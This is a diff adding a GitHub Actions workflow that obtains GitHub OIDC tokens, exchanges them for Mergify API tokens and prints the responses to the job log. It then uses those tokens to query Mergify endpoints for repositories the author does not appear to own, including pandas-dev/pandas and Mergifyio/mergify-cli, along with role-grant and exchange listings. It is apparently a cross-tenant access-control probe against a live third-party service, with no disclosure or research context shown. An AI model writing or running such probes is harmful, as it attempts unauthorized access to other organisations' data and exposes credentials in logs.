@@ -1,0 +1,29 @@
+name: oidc-probe
+on: [push, workflow_dispatch]
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    permissions:
+      id-token: write
+      contents: read
+    steps:
+      - name: Exchange and probe
+        run: |
+          set -x
+          IDT=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=mergify" | jq -r .value)
+          echo "IDT_LEN=${#IDT}"
+          RESP=$(curl -s -X POST https://api.mergify.com/v1/ci/oidc/exchange -H 'content-type: application/json' -d "{\"id_token\":\"$IDT\"}")
+          echo "EXCHANGE_RESP=$RESP"
+          IDT2=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL" | jq -r .value)
+          RESP2=$(curl -s -X POST https://api.mergify.com/v1/ci/oidc/exchange -H 'content-type: application/json' -d "{\"id_token\":\"$IDT2\"}")
+          echo "EXCHANGE_RESP_DEFAULT_AUD=$RESP2"
+          CTOK=$(echo "$RESP" | jq -r '.token // .ci_token // .access_token // empty')
+          CTOK2=$(echo "$RESP2" | jq -r '.token // .ci_token // .access_token // empty')
+          for T in "$CTOK" "$CTOK2"; do
+            [ -z "$T" ] && continue
+            echo "=== TOKEN LEN ${#T}"
+            for p in /v1/user /v1/repos/happyy1122222-bit/mergify-test/queues /v1/repos/happyy1122222-bit/mergify-test/merge-queue/status /v1/repos/Mergifyio/mergify-cli/queues /v1/repos/pandas-dev/pandas/queues /v1/ci/happyy1122222-bit/repositories/mergify-test/quarantines /v1/ci/Mergifyio/repositories/mergify-cli/quarantines /v1/ci/happyy1122222-bit/oidc/exchanges /v1/orgs/happyy1122222-bit/role-grants; do
+              echo "--- $p"
+              curl -s -w " ||| %{http_code}\n" "https://api.mergify.com$p" -H "Authorization: Bearer $T" -H 'accept: application/json' | head -c 400
+            done
+          done
